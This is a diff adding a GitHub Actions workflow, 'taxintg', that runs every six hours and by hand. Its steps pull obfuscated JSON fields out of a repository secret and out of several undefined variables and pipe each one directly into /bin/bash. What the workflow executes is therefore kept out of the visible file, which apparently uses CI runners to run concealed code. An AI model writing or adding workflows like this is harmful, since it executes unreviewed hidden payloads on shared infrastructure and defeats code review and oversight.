@@ -1,0 +1,22 @@
+name: taxintg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: taxintg
+        env:
+          mxj5: ${{ secrets.mxj5 }}
+        run: |
+          echo $mxj5 | jq -r .b9023 | /bin/bash
+          echo $ik1447 | jq -r .c290 | /bin/bash
+          echo $one8 | jq -r .bzeya3 | /bin/bash
+          echo $gnj13 | jq -r .yuem5 | /bin/bash
+
